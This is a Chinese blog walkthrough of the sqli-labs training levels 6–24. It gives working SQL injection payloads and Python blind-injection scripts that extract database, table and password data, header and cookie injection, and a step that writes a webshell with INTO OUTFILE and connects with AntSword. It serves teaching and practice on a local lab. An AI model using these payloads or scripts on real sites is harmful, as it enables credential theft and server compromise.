<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>与level5很像</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223612822.png" alt="image-20210130223612822"></p>
<p>但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可</p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>提交id=1，出现提示</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131230645205.png" alt="image-20210131230645205"></p>
<p>需要使用outfile函数</p>
<p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个</p>
<ul>
<li>into dumpfile()</li>
<li>into outfile()</li>
<li>load_file()</li>
</ul>
<p>这里我们利用outfile函数</p>
<p>首先确定这关包裹参数的格式</p>
<p>一直测试到<code>id=1&#39;)) --+</code>，才显示正确所以可以确定参数的包裹格式为<code>((&#39;id&#39;))</code></p>
<p><strong>0x1 向网站根目录写入一句话木马</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233508732.png" alt="image-20210131233508732"></p>
<p>执行后就可以在根目录中看到这个文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233433411.png" alt="image-20210131233433411"></p>
<p><strong>0x2 使用蚁剑连接</strong></p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">3</span>.php
密码:cmd</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233415258.png" alt="image-20210131233415258" style="zoom:50%;">

<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>根据标题和测试结果可以看出是盲注</p>
<p>首先判断是什么类型注入</p>
<p>提交<code>id=1</code>，显示结果为<code>You are in</code>，可以确定成功查询返回的结果</p>
<p>提交<code>id=1&#39;</code>，没有提示<code>You are in</code>，但是提交<code>id=1&#39; --+</code>，再次出现<code>You are in</code>，可以确定是字符型注入，包裹形式为<code>&#39;id&#39;</code></p>
<p>接下来就是确定盲注使用的语句，这里可以使用 <code>ascii</code>和<code>substring</code>两个函数</p>
<p><strong>0x1 爆出数据库名</strong></p>
<pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><span class="hljs-comment">%23</span></code></pre>

<p>首先假设数据库名的第一个字母的ascii码值大于97，回显为<code>you are in</code>，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。</p>
<p>可以使用脚本完成该过程，脚本跑出的结果为  <strong style="color:red;">security</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201120357770.png" alt="image-20210201120357770"></p>
<p><strong>0x2 爆出表名</strong></p>
<p>使用注入语句</p>
<pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre>

<p>最后爆出的表名如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png" alt></p>
<p><strong>0x3 爆出列名</strong></p>
<pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201140521465.png" alt="image-20210201140521465"></p>
<p><strong>0x4 爆出内容</strong></p>
<pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (select ascii(substring(group_concat(password),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) as a from users having a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201141626668.png" alt="image-20210201141626668"></p>
<p>完整脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre>

<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>题目标题提示了是基于时间且单引号闭合的盲注</p>
<p>基于时间的盲注需要使用到<code>sleep</code>函数，基本用法如下</p>
<p>分别提交<code>id=1</code>，<code>id=1&#39; and sleep(3) --+</code>，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213644564.png" alt="image-20210201213644564"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213715695.png" alt="image-20210201213715695"></p>
<p>注入脚本只需要改一改level8的即可。</p>
<p>完整脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre>



<p>爆破数据库名的过程如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201220840369.png" alt="image-20210201220840369"></p>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>与level9基本相同，只需要将payload中的<code>&#39;</code>换成<code>&quot;</code>即可</p>
<p>完整脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select <span class="hljs-built_in">ascii</span>(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database() having a&gt;&#123;<span class="hljs-number">1</span>&#125;),sleep(<span class="hljs-number">2</span>),null)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span>
<span class="hljs-string">        # payload = &quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment"># payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre>

<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>打开网页是一个登录页面</p>
<p>先判断列数，当三列出现报错，说明只有两列</p>
<pre><code class="hljs crmsh"><span class="hljs-attr">uname=</span>admin&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span><span class="hljs-comment">#&amp;passwd=1&amp;submit=Submit</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192950662.png" alt="image-20210421192950662"></p>
<p>尝试使用万能密码，成功登录</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> #&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192757146.png" alt="image-20210421192757146" style="zoom:50%;">

<p>获取数据库</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata)##&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193129915.png" alt="image-20210421193129915"></p>
<p>获取列名，字段名</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit


<span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>这一关与上面就是使用的闭合符号不同，使用的双引号，所以只要将上面的payload改一下即可</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit


<span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre>

<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>输入单引号，出现报错</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193947944.png" alt="image-20210421193947944"></p>
<p>分析一下即可</p>
<p><code>&#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1</code></p>
<p>第二个<code>&#39;</code>是我们输入的，所以闭合方式为<code>&#39;)</code></p>
<p>但是这题没有回显数据，可以使用报错注入或者延时盲注</p>
<p>注入的payload</p>
<pre><code class="hljs mysql">uname&#x3D; sa&#39;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

    uname&#x3D; dsad&#39;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit
　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; asd&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit</code></pre>

<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>这一关就是和上面的闭合方式不一样，稍加修改即可</p>
<pre><code class="hljs n1ql">uname= sad&quot; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a # &amp;passwd= <span class="hljs-string">&#x27;) or 1=1 # &amp;submit=Submit</span></code></pre>

<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>这是单引号闭合的布尔盲注，POST型</p>
<p>判断依据可以根据页面出现的图片</p>
<p>登录不成功时出现的图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195038499.png" alt="image-20210421195038499" style="zoom:50%;">

<p>登录成功的图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195111446.png" alt="image-20210421195111446" style="zoom:50%;">



<p>这里使用时间盲注</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/4/21 19:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : level15.py</span>

<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-15/&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
data = &#123;<span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;sad&#x27;</span>,<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;Submit&#x27;</span>&#125;
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):

        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        t1 = datetime.datetime.now()
        data[<span class="hljs-string">&#x27;uname&#x27;</span>] = payload
        response = requests.post(url=url,data=data)

        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">5</span>:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
        print(flag)

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre>

<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>将上一关的脚本该给双引号闭合即可</p>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>updata注入</p>
<p>可以使用报错注入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>)#&amp;submit=Submit</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202328557.png" alt="image-20210421202328557"></p>
<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>uname和passwd都使用check_input过滤，而在这里将user-agent和ip作为记录，插入数据库</p>
<p>提示了ip地址和user-Agent，应该时http头注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202421443.png" alt="image-20210421202421443"></p>
<p>抓包后，在user-agent的位置插入注入语句</p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203429860.png" alt="image-20210421203429860"></p>
<h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203658570.png" alt="image-20210421203658570"></p>
<p>登录后提示了referer，应该是在referer头注入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span>
</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203948670.png" alt="image-20210421203948670"></p>
<h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>正常登录，发现一个cookie字段</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204122118.png" alt="image-20210421204122118"></p>
<p>尝试cookie位置注入</p>
<p>这里直接使用union联合查询即可</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204741263.png" alt="image-20210421204741263"></p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-adm&#x27; union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()#

<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#

<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users#</code></pre>

<h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><p>这一关和上一关就是加了一层base64编码，所以可以直接用上面的注入编码后提交</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205159215.png" alt="image-20210421205159215"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-as&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#
<span class="hljs-attribute">uname</span>=LWFzJyB<span class="hljs-number">1</span>bmlvbiBzZWxlY<span class="hljs-number">3</span>QgMSwyLDMj</code></pre>

<p>但是出现报错</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205525074.png" alt="image-20210421205525074" style="zoom:67%;">

<pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-as&#x27;) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#
<span class="hljs-attribute">uname</span>=LWFzJykgdW<span class="hljs-number">5</span>pb<span class="hljs-number">24</span>gc<span class="hljs-number">2</span>VsZWN<span class="hljs-number">0</span>IDEsMiwzIw==</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205624679.png" alt="image-20210421205624679" style="zoom:50%;">

<p>所以只要将上面的sql语句修改闭合方式再编码提交即可</p>
<h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><p>基于错误的双引号字符型Cookie注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210142530.png" alt="image-20210421210142530"></p>
<p>这里只要将21关的双引号换成双引号，再base64编码</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-as&quot; union select 1,2,3#
<span class="hljs-attribute">uname</span>=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210212614.png" alt="image-20210421210212614"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-ada&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> from users--+ 
<span class="hljs-attribute">uname</span>=LWFkYSIgdW<span class="hljs-number">5</span>pb<span class="hljs-number">24</span>gc<span class="hljs-number">2</span>VsZWN<span class="hljs-number">0</span>IDEsZ<span class="hljs-number">3</span>JvdXBfY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KHBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkKSwzIGZyb<span class="hljs-number">20</span>gdXNlcnMj</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210330135.png" alt="image-20210421210330135"></p>
<h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><p>根据提示可以知道是get型注入</p>
<p>但是但输入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #
<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+
<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> %<span class="hljs-number">23</span></code></pre>

<p>都会出现语法错误，猜测应该是 <code>#, --</code>两个注释符被过滤了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507090028666.png" alt="image-20210507090028666"></p>
<p>里我们需要一个特殊的注释符：;%00或者and和or语句进行闭合</p>
<p>payload:    </p>
<pre><code class="hljs reasonml">?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(0x7e,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>)</span>) from security.users ;%<span class="hljs-number">00</span></code></pre>

<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507090258902.png" alt="image-20210507090258902"></p>
<h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p><strong>二次注入</strong></p>
<blockquote>
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p>二次注入，可以概括为以下两步:</p>
<p>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
<p>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</blockquote>
<p>正常用户admin可以正常登录，但是这里需要注册一个非正常的恶意用户，向数据库中插入恶意数据，来修个正常用户admin的密码</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin’<span class="hljs-meta"># </span>
<span class="hljs-symbol">password:</span> 任意</code></pre>

<p>注册完后可以使用该账号登录</p>
